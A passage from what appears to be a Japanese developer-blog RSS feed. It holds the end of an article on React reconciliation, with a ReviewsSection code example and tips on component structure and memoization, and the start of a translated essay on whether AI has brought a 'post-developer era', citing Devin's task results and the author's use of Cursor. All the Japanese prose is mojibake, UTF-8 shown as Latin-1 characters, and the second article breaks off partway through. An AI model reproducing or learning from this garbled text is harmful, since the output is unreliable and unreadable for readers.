<span class="token keyword">const</span> <span class="token function-variable function">ReviewsSection</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> productId <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">[</span>reviews<span class="token punctuation">,</span> setReviews<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token function">fetchReviews</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>setReviews<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>productId<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Reviews</span></span> <span class="token attr-name">reviews</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>reviews<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã®æ§‹é€ ã§ã¯ã€è£½å“ã‚µã‚¤ã‚ºã‚’å¤‰ãˆã¦ã‚‚ãƒ¬ãƒ“ãƒ¥ãƒ¼ãŒå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ¡ãƒ¢åŒ–ã‚‚ä¸è¦ã§ã™ã€‚ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å¢ƒç•Œã‚’æ˜ç¢ºã«ã™ã‚‹ã ã‘ã§ã™ã€‚</p>
<h2>å·®åˆ†æ¤œå‡ºã¨ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£</h2>
<p>å·®åˆ†æ¤œå‡ºã«é–¢ã™ã‚‹ã“ã†ã—ãŸç†è§£ã¯ã€ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®åŸå‰‡ã¨ã‚‚å®Œå…¨ã«ä¸€è‡´ã—ã¾ã™ã€‚</p>
<ol>
<li><strong>å˜ä¸€è²¬ä»»ã®åŸå‰‡</strong>ï¼šã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å¤‰æ›´ã™ã‚‹ç†ç”±ã¯1ã¤ã«é™å®šã—ã¾ã™ã€‚å„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒ1ã¤ã®è²¬ä»»ã«å¾¹ã™ã‚‹ã“ã¨ã§ã€ä¸è¦ãªå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒä½ããªã‚Šã¾ã™ã€‚</li>
<li><strong>ä¾å­˜é–¢ä¿‚é€†è»¢</strong>ï¼šã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯å…·ä½“çš„ãªå®Ÿè£…ã§ã¯ãªãã€æŠ½è±¡åŒ–ã«ä¾å­˜ã™ã‚‹ã¹ãã§ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€ã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æœ€é©åŒ–ã—ã‚„ã™ããªã‚Šã¾ã™ã€‚</li>
<li><strong>ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹åˆ†é›¢</strong>ï¼šã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ã¯ã€æœ€ä½é™ã®ç‰¹åŒ–ã—ãŸã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä¸ãˆã¾ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€propsã®å¤‰æ›´ãŒä¸è¦ãªå†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹å¯èƒ½æ€§ãŒä½ããªã‚Šã¾ã™ã€‚</li>
</ol>
<h2>å®Ÿè·µçš„ã‚¬ã‚¤ãƒ‰ãƒ©ã‚¤ãƒ³</h2>
<p>å·®åˆ†æ¤œå‡ºã«é–¢ã™ã‚‹æ·±æ˜ã‚Šã«åŸºã¥ãå®Ÿè·µçš„ãªã‚¢ãƒ‰ãƒã‚¤ã‚¹ã‚’ã„ãã¤ã‹ç´¹ä»‹ã—ã¾ã™ã€‚</p>
<ol>
<li><strong>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å®šç¾©ã¯è¦ªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å¤–ã«ç½®ã</strong>ã€å†ãƒã‚¦ãƒ³ãƒˆã‚’å›é¿ã™ã‚‹ã€‚</li>
<li><strong>stateã‚’ãƒªãƒ•ãƒˆãƒ€ã‚¦ãƒ³ã—</strong>ã€å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®å¢ƒç•Œã‚’åˆ†é›¢ã™ã‚‹ã€‚</li>
<li><strong>åŒã˜ä½ç½®ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚¿ã‚¤ãƒ—ã®ä¸€è²«æ€§ã‚’ä¿ã¡</strong>ã€ã‚¢ãƒ³ãƒã‚¦ãƒ³ãƒˆã‚’å›é¿ã™ã‚‹ã€‚</li>
<li><strong>keyã‚’æˆ¦ç•¥çš„ã«åˆ©ç”¨ã™ã‚‹</strong>ã€‚ãƒªã‚¹ãƒˆã«é™ã‚‰ãšã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ã‚’åˆ¶å¾¡ã—ãŸã„å ´åˆã«ä½¿ç”¨ã™ã‚‹ã€‚</li>
<li><strong>å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°å•é¡Œã‚’ãƒ‡ãƒãƒƒã‚°ã™ã‚‹éš›</strong>ã€è¦ç´ ãƒ„ãƒªãƒ¼ã¨ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®è­˜åˆ¥æƒ…å ±ã®è¦³ç‚¹ã§è€ƒãˆã‚‹ã€‚</li>
<li><strong>React.memoã¯å·®åˆ†æ¤œå‡ºã®åˆ¶ç´„ã®ç¯„å›²å†…ã§æœ‰åŠ¹ãªãƒ„ãƒ¼ãƒ«</strong>ã«ã™ããªã„ã“ã¨ã‚’å¿µé ­ã«ç½®ãã€‚åŸºæœ¬çš„ãªã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯å¤‰ã‚ã‚‰ãªã„ã€‚</li>
</ol>
<h2>ãŠã‚ã‚Šã«</h2>
<p>Reactã®å·®åˆ†æ¤œå‡ºã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’ç†è§£ã™ã‚‹ã¨ã€Reactã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã«é–¢ã™ã‚‹ã•ã¾ã–ã¾ãªãƒ‘ã‚¿ãƒ¼ãƒ³ã®ä»•çµ„ã¿ãŒè¦‹ãˆã¦ãã¾ã™ã€‚ã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ãŒãªãœã“ã‚Œã»ã©ã¾ã§ã«æœ‰åŠ¹ãªã®ã‹ã‚„ã€ãƒªã‚¹ãƒˆã«keyãŒå¿…è¦ã§ã‚ã‚‹ç†ç”±ã€ä»–ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆå†…ã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®šç¾©ã™ã‚‹ã®ãŒãªãœå•é¡Œãªã®ã‹ãŒã‚ã‹ã‚Šã¾ã™ã€‚</p>
<p>ã“ã®çŸ¥è­˜ã‚’èº«ã«ã¤ã‘ã‚‹ã“ã¨ã§ã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«é–¢ã—ã¦ã‚ˆã‚Šè‰¯ã„åˆ¤æ–­ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã€Reactã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚‚è‡ªç„¶ã¨å‘ä¸Šã—ã¾ã™ã€‚Reactã®å·®åˆ†æ¤œå‡ºã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã«éå‰°ãªãƒ¡ãƒ¢åŒ–ã§å¯¾æŠ—ã™ã‚‹ã®ã§ã¯ãªãã€ReactãŒã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è­˜åˆ¥ã—ã€æ›´æ–°ã™ã‚‹æ–¹æ³•ã«åˆã‚ã›ãŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆæ§‹é€ ã‚’è¨­è¨ˆã™ã‚‹ã“ã¨ã§ã€ã†ã¾ãReactã‚’ä½¿ã„ã“ãªã›ã‚‹ã‚ˆã†ã«ãªã‚‹ã¯ãšã§ã™ã€‚</p>
<p>æ¬¡ã«Reactã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æœ€é©åŒ–ã™ã‚‹éš›ã«ã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆæ§‹é€ ãŒå·®åˆ†æ¤œå‡ºãƒ—ãƒ­ã‚»ã‚¹ã«ã©ã®ã‚ˆã†ãªå½±éŸ¿ã‚’åŠã¼ã—ã¦ã„ã‚‹ã®ã‹ã‚’è€ƒãˆã¦ã¿ã¦ãã ã•ã„ã€‚ReactãŒã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è­˜åˆ¥ã—ã€æ›´æ–°ã™ã‚‹æ–¹æ³•ã‚’è¸ã¾ãˆãŸã€ã‚ˆã‚Šã‚·ãƒ³ãƒ—ãƒ«ã§ç‰¹åŒ–ã—ãŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãƒ„ãƒªãƒ¼ãŒæœ€ã‚‚åŠ¹æœçš„ãªæœ€é©åŒ–ã§ã‚ã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚</p>]]></content:encoded></item><item><title><![CDATA[ãƒã‚¹ãƒˆãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼æ™‚ä»£]]></title><description><![CDATA[ä»Šã‹ã‚‰2å¹´å‰ã®2023å¹´3æœˆã«â€œThe End of Front-End Developmentâ€ï¼ˆãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰é–‹ç™ºã®çµ‚ç„‰ï¼‰ã¨ã„ã†è¨˜äº‹ã‚’æŠ•ç¨¿ã—ã¾ã—ãŸã€‚ã¡ã‚‡ã†ã©OpenAIãŒGPT-4ã‚’ç™ºè¡¨ã—ãŸå¾Œã§â€¦]]></description><link>https://postd.cc/the-post-developer-era/</link><guid isPermaLink="false">https://postd.cc/the-post-developer-era/</guid><category><![CDATA[ã‚­ãƒ£ãƒªã‚¢ãƒ»åƒãæ–¹]]></category><category><![CDATA[ç”ŸæˆAI]]></category><pubDate>Thu, 26 Jun 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>ä»Šã‹ã‚‰2å¹´å‰ã®2023å¹´3æœˆã«â€œ<a href="https://www.joshwcomeau.com/blog/the-end-of-frontend-development/">The End of Front-End Development</a>â€ï¼ˆãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰é–‹ç™ºã®çµ‚ç„‰ï¼‰ã¨ã„ã†è¨˜äº‹ã‚’æŠ•ç¨¿ã—ã¾ã—ãŸã€‚ã¡ã‚‡ã†ã©OpenAIãŒGPT-4ã‚’ç™ºè¡¨ã—ãŸå¾Œã§ã€å¤šãã®äººãŒè¿‘ã„å°†æ¥ã€ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯ã™ã¹ã¦æ©Ÿæ¢°ãŒä½œã‚‹ã‚ˆã†ã«ãªã‚Šã€äººé–“ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºè€…ã¯ä¸è¦ã«ãªã‚‹ã ã‚ã†ã¨ã„ã†è€ƒãˆã«å‚¾ã„ã¦ã„ã¾ã—ãŸã€‚</p>
<p>ç­†è€…ã¯ã“ã†ã—ãŸè«–èª¿ã«ã¯æ‡ç–‘çš„ã§ã€å½“é¢ã®é–“ã€ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é–‹ç™ºã¯ä¾ç„¶ã¨ã—ã¦äººé–“ã®åŠ©ã‘ã‚’å¿…è¦ã¨ã™ã‚‹ã ã‚ã†ã¨å‰è¿°ã®è¨˜äº‹ã®ä¸­ã§ä¸»å¼µã—ã€ãã®ç†ç”±ã‚’è«–ã˜ã¾ã—ãŸã€‚ç­†è€…ãŒç«‹ã¦ãŸä»®èª¬ã¯ã€å¤§è¦æ¨¡è¨€èªãƒ¢ãƒ‡ãƒ«ï¼ˆLLMï¼‰ã¯äººé–“ã®é–‹ç™ºè€…ã‚’ç½®ãæ›ãˆã‚‹ã®ã§ã¯ãªãã€è£œå¼·ã™ã‚‹ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚</p>
<p>å½“æ™‚ã€Twitterä¸Šã§ã¯AIã®ç™»å ´ã«ã‚ˆã‚Šæ•°ã‚«æœˆã€é•·ãã¦ã‚‚1ã€2å¹´ã§äººé–“ã®ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰é–‹ç™ºè€…ã®éœ€è¦ã¯ç„¡ããªã‚‹ã¨ã®æ„è¦‹ãŒå¤§å‹¢ã‚’å ã‚ã¦ã„ã¾ã—ãŸã€‚ã‚ã‚Œã‹ã‚‰2å¹´ä»¥ä¸ŠãŒçµŒã¡ã¾ã™ãŒã€ç¾å®Ÿã¯ã©ã†ã§ã—ã‚‡ã†ã‹ã€‚å½“æ™‚è¨€ã‚ã‚Œã¦ã„ãŸã‚ˆã†ãªã€Œãƒã‚¹ãƒˆãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã€æ™‚ä»£ã¯åˆ°æ¥ã—ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ã“ã®è¨˜äº‹ã§ã¯ã€ç¾åœ¨ã®çŠ¶æ³ã‚’æ–°ãŸãªè¦–ç‚¹ã‹ã‚‰æ‰ãˆç›´ã—ã€ä½•ãŒã©ã†å¤‰ã‚ã£ãŸã®ã‹ã€ä»Šå¾Œã©ã®ã‚ˆã†ãªé€²åŒ–ã®éç¨‹ã‚’è¾¿ã‚‹ã®ã‹ã‚’æ¤œè¨ã—ã¦ã¿ãŸã„ã¨æ€ã„ã¾ã™ã€‚ã“ã®è¨˜äº‹ãŒã€é–‹ç™ºè€…ã‚’å¿—ã—ãªãŒã‚‰ã‚‚ä»Šå¾Œã®ã‚­ãƒ£ãƒªã‚¢ã«ä¸å®‰ã‚’è¦šãˆã¦ã„ã‚‹èª­è€…ã®å‚è€ƒã«ãªã‚Œã°å¹¸ã„ã§ã™ã€‚â¤ï¸</p>
<h2>ä¼æ¥­ã«ã‚ˆã‚‹AIã®åˆ©ç”¨çŠ¶æ³</h2>
<p>ã“ã“æ•°å¹´ã€AIãƒ„ãƒ¼ãƒ«ã‚’å°å…¥ã™ã‚‹ä¼æ¥­ãŒã¾ã™ã¾ã™å¢—ãˆã¦ã„ã¾ã™ã€‚æœ€è¿‘ã€ãƒ•ã‚©ãƒ¼ãƒ–ã‚¹èªŒã«â€œ<a href="https://www.forbes.com/sites/jackkelly/2024/11/01/ai-code-and-the-future-of-software-engineers/">AI Writes Over 25% Of Code At Google</a>â€ï¼ˆGoogleç¤¾ã§ã¯25%ä»¥ä¸Šã®ã‚³ãƒ¼ãƒ‰ã‚’AIãŒæ›¸ã„ã¦ã„ã‚‹ï¼‰ã¨ã„ã†è¨˜äº‹ãŒæ²è¼‰ã•ã‚Œã¾ã—ãŸã€‚</p>
<p>ã“ã®è¨˜äº‹ã®ã‚¿ã‚¤ãƒˆãƒ«ã¯ã€AIãŒ25ï¼…ã€äººé–“ãŒæ®‹ã‚Šã®75%ã®ä»•äº‹ã‚’è¡Œã£ã¦ã„ã‚‹ã‚ˆã†ã«èª­ã‚ã¾ã™ãŒã€å®Ÿéš›ã¯ãã†ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã‚Œã¯èª¤è§£ã‚’æ‹›ãã‚¿ã‚¤ãƒˆãƒ«ã ã¨æ€ã„ã¾ã™ã€‚</p>
<p>Googleç¤¾ã§ã‚³ãƒŸãƒƒãƒˆã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã®25%ã‚’AIãŒç”Ÿæˆã—ã¦ã„ãŸã¨ã—ã¦ã‚‚ã€AIãŒå˜ç‹¬ã§ä½œæ¥­ã‚’è¡Œã£ã¦ã„ã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ç†Ÿç·´ã—ãŸäººé–“ã®é–‹ç™ºè€…ãŒé‹è»¢å¸­ã«åº§ã‚Šã€çŸ¥è­˜ã¨çµŒé¨“ã‚’ã‚‚ã¨ã«AIã‚’æ“ã‚Šã€ç”Ÿæˆç‰©ã‚’ç·¨é›†ã—ãŸã‚Šå½¢æˆã—ãŸã‚Šã—ãŸä¸Šã§ã€è‡ªåˆ†ãŒæ›¸ã„ãŸã‚³ãƒ¼ãƒ‰ã«çµ„ã¿è¾¼ã‚“ã§ã„ã‚‹ã®ã§ã™ã€‚ç­†è€…ã®çŸ¥ã‚‹é™ã‚Šã€Googleç¤¾ã§ã¯ä»Šã‚‚ã‚³ãƒ¼ãƒ‰ã¯100%ã€Œé–‹ç™ºè€…ã€ãŒä½œæˆã—ã¦ã„ã¾ã™ã€‚AIã¯å½¼ã‚‰ãŒä»•äº‹ã§ä½¿ã†å¤šãã®ãƒ„ãƒ¼ãƒ«ã®ä¸€ã¤ã«éããªã„ã®ã§ã™ã€‚</p>
<p>ã¤ã¾ã‚Šã€Googleç¤¾ã¯è£½å“ãƒãƒ¼ãƒ ã®é–‹ç™ºè€…ã®25ï¼…ã‚’è§£é›‡ã—ã€ç–‘ä¼¼çŸ¥æ€§ã‚’æŒã¤AIãƒ­ãƒœãƒƒãƒˆãŒãã®ä»£ã‚ã‚Šã‚’å‹™ã‚ã€ãƒ—ãƒ­ãƒ€ã‚¯ãƒˆãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ç›´å±ã®éƒ¨ä¸‹ã¨ã—ã¦è‡ªå¾‹çš„ã«ä½œæ¥­ã‚’è¡Œã£ã¦ã„ã‚‹ã‚ã‘ã§ã¯ãªã„ã¨ã„ã†ã“ã¨ã§ã™ã€‚å¤§æ‰‹ãƒã‚¤ãƒ†ã‚¯ä¼æ¥­ã§ãã®ã‚ˆã†ãªã“ã¨ãŒèµ·ãã¦ã„ã‚‹ã¨ã„ã†è©±ã¯èã„ãŸã“ã¨ãŒã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>ä¸€æ–¹ã§ã€è‡ªç¤¾ã®AIãŒäººé–“ã®é–‹ç™ºè€…ã‚’å®Œå…¨ã«ç½®ãæ›ãˆã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ä¸»å¼µã—ã¦ã„ã‚‹ã‚¹ã‚¿ãƒ¼ãƒˆã‚¢ãƒƒãƒ—ä¼æ¥­ã¯ã‚ã‚Šã¾ã™ã€‚ä¸­ã§ã‚‚æœ€ã‚‚ã‚ˆãçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ã®ã¯ã€1å¹´å‰ã®2024å¹´3æœˆã«Cognitionç¤¾ãŒç™ºè¡¨ã—ãŸDevinã¨ã„ã†è£½å“ã§ã™ã€‚ã—ã‹ã—ã€å®Ÿéš›ã«ä¼æ¥­ãŒä½¿ãŠã†ã¨ã™ã‚‹ã¨ã€ã•ã¾ã–ã¾ãªå•é¡Œã«ç›´é¢ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€ã‚ã‚‹ãƒãƒ¼ãƒ ã®å ±å‘Šã«ã‚ˆã‚‹ã¨ã€Devinã¯å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸ<a href="https://www.answer.ai/posts/2025-01-08-devin.html">20ä»¶ã®ã‚¿ã‚¹ã‚¯ã®ã†ã¡3ä»¶ã—ã‹å®Œäº†ã§ããš</a>ã€çµå±€ã¯æ‰‹é–“ãŒã‹ã‹ã‚Šå°å…¥ã™ã‚‹ä¾¡å€¤ã¯ãªã„ã¨åˆ¤æ–­ã•ã‚ŒãŸã‚ˆã†ã§ã™ã€‚ã“ã®ãƒãƒ¼ãƒ ã¯1ã‚«æœˆã§ä½¿ã†ã®ã‚’ã‚„ã‚ã¾ã—ãŸã€‚</p>
<p>ä¸€éƒ¨ã®ãƒ¡ãƒ³ãƒãƒ¼ã®å£°ã‚’ç´¹ä»‹ã—ã¾ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>AIã¯ååˆ†ã«å®šç¾©ã•ã‚ŒãŸå°ã•ãªã‚¿ã‚¹ã‚¯ã¯ã“ãªã›ã¾ã™ãŒã€è‡ªåˆ†ã§ã‚„ã£ãŸæ–¹ãŒæ—©ãã€å¥½ããªã‚„ã‚Šæ–¹ã§ã§ãã‚‹ã®ã§ã€ãã®æ–¹ãŒã„ã„ã§ã™ã€‚æ™‚é–“ã‚’ç¯€ç´„ã§ããã†ãªå¤§ããªã‚¿ã‚¹ã‚¯ã¯å¤±æ•—ã™ã‚‹å¯èƒ½æ€§ãŒé«˜ã„ã¨æ€ã„ã¾ã™ã€‚çµå±€ã€ä½¿ã„ãŸã„å ´é¢ãŒã‚ã¾ã‚Šãªã„ã¨ã„ã†å°è±¡ã§ã™ã€‚</p><p>-- ã‚¸ãƒ§ãƒãƒ»ã‚¦ã‚£ãƒ†ã‚«ãƒ¼<br></p></div></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>è‡ªåˆ†ã§æ‰‹ã‚’åŠ ãˆã‚‰ã‚Œã‚‹ã®ã§ã€æœ€åˆã¯ã™ã”ãèº«è¿‘ã«æ„Ÿã˜ã‚‰ã‚Œã¦æ„Ÿå‹•ã—ãŸã®ã§ã™ãŒã€ä½¿ã£ã¦ã„ã‚‹ã†ã¡ã«å¤‰æ›´ãŒå¿…è¦ãªç‚¹ãŒã©ã‚“ã©ã‚“å‡ºã¦ãã¦ã€æ¬¡ç¬¬ã«ä¸æº€ãŒæºœã¾ã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚æœ€çµ‚çš„ã«ã¯ä¸€ã‹ã‚‰é †ç•ªã«ã‚„ã‚Šç›´ã—ãŸæ–¹ãŒã„ã„ã¨ã„ã†çµè«–ã«é”ã—ã¾ã—ãŸã€‚</p><p>-- ã‚¢ã‚¤ã‚¶ãƒƒã‚¯ãƒ»ãƒ•ãƒ©ã‚¹<br></p></div></div>
<p>ã“ã‚Œã‚‰ã®æ„è¦‹ã¯AIæ‡ç–‘è«–è€…ã®ã‚‚ã®ã§ã¯ãªãã€AIé–¢é€£ã®ã‚¹ã‚¿ãƒ¼ãƒˆã‚¢ãƒƒãƒ—ä¼æ¥­ã«åœ¨ç±ã—ã€ç†±æ„ã¨å–„æ„ã‚’æŒã£ã¦è£½å“ã‚’ä½¿ã£ã¦ã¿ãŸæŠ€è¡“è€…ã®ã‚‚ã®ã§ã™ã€‚ã¾ãŸã€å½¼ã‚‰ã®ä½“é¨“ã¯ä¾‹å¤–çš„ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ä»–ã«ã‚‚ã„ãã¤ã‹å®Ÿéš›ã«AIã‚’ä½¿ç”¨ã—ãŸäººã®ä½“é¨“è«‡ãƒ»ãƒ–ãƒ­ã‚°ãªã©ã‚’èª­ã¿ã¾ã—ãŸãŒã€ã©ã‚Œã‚‚ã‚ã¾ã‚Šå½¹ã«ç«‹ãŸãªã„ã¨ã„ã†çµè«–ã§ä¸€è‡´ã—ã¦ã„ã¾ã—ãŸã€‚</p>
<p><strong>ç­†è€…ã®çŸ¥ã‚‹é™ã‚Šã€AIå°å…¥ã®æˆåŠŸäº‹ä¾‹ã«ã¯å¿…ãšç†Ÿç·´ã—ãŸäººé–“ã®é–‹ç™ºè€…ãŒé–¢ã‚ã£ã¦ã„ã¾ã™</strong>ã€‚ã—ãŸãŒã£ã¦ã€ãƒã‚¹ãƒˆãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼æ™‚ä»£ã¯åˆ°æ¥ã—ã¦ã„ãªã„ã¨è¨€ãˆã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<h2>é€¸è„±ã™ã‚‹AI</h2>
<p>ç­†è€…è‡ªèº«ã€æ•°å¹´å‰ã‹ã‚‰å¤šæ•°ã®AIãƒ„ãƒ¼ãƒ«ã‚’è©¦ã—ã¦ã¿ã¦ã„ã¾ã™ã€‚æ•°ã‚«æœˆå‰ã€AIé§†å‹•ã®çµ±åˆé–‹ç™ºç’°å¢ƒï¼ˆIDEï¼‰ã§ã‚ã‚‹<a href="https://www.cursor.com/">Cursor</a>ã«ä¹—ã‚Šæ›ãˆã¾ã—ãŸã€‚Claude Sonnetã§Cursorã®ã€Œã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã€ãƒ¢ãƒ¼ãƒ‰ã‚’ä½¿ã£ã¦ã„ã¾ã™ãŒã€ç‡ç›´ã«è¨€ã£ã¦ã‹ãªã‚Šç´ æ™´ã‚‰ã—ã„ã§ã™ã€‚ç‰¹å®šã®ç¨®é¡ã®ã‚¿ã‚¹ã‚¯ã§ã¯ã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆæƒ…å ±ã‚’ä¸ãˆã¦æ­£ã—ã„æ–¹å‘ã‚’ç¤ºã›ã°ã€å®Ÿè¡Œå¯èƒ½ãªã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä¸€ç™ºã§ç”Ÿæˆã—ã¦ãã‚Œã¾ã™ã€‚</p>
<p>TypeScriptã®å‹ã®ã‚¨ãƒ©ãƒ¼ã‚„ãƒªãƒ³ã‚¿ãƒ¼ã‚¨ãƒ©ãƒ¼ã‚’æ¤œå‡ºã—ã€å¤šãã®å ´åˆã€ä¿®æ­£ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚æ–°ãŸãªç™ºè¦‹ã‚„å­¦ã³ãŒå¾—ã‚‰ã‚ŒãŸã“ã¨ã‚‚ä½•åº¦ã‹ã‚ã‚Šã¾ã—ãŸã€‚ç­†è€…ãŒçŸ¥ã‚‰ãªã„APIã‚’ä½¿ã£ãŸã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’AIãŒææ¡ˆã—ã¦ãã‚ŒãŸãŠã‹ã’ã§ã€å½“åˆæ¤œè¨ã—ã¦ã„ãŸã‚‚ã®ã‚ˆã‚Šã‚‚è‰¯ã„ã‚³ãƒ¼ãƒ‰ãŒæ›¸ã‘ã¾ã—ãŸã€‚</p>
<p><strong>ã—ã‹ã—ã€AIã¯å®Œç’§ã§ã¯ã‚ã‚Šã¾ã›ã‚“</strong>ã€‚èª˜å°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
